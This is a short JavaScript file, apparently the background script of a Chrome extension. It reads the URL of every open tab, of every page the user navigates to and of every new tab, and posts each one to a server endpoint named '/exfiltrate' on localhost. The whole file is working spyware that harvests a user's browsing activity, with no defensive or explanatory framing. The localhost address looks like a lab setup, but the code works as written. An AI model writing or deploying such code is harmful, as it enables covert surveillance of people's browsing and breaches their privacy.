// Function to send a URL to the server
function sendUrlToServer(url) {
  fetch("http://localhost:3000/exfiltrate", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ type: "urls", data: url }),
    })
    .then((response) => {
      if (response.ok) {

      } else {
        console.error("Failed to send URL:", url, response.statusText);
      }
    })
    .catch((error) => {
      console.error("Error sending URL:", url, error);
    });
}

// Loop through all currently open tabs and send their URLs
chrome.tabs.query({}, (tabs) => {
  tabs.forEach((tab) => {
    if (tab.url) {
      sendUrlToServer(tab.url);
    }
  });
});

// Listen for tab updates (e.g., when a user navigates to a new URL)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    sendUrlToServer(changeInfo.url);
  }
});

// Listen for new tabs being created
chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url) {
    sendUrlToServer(tab.url);
  }
});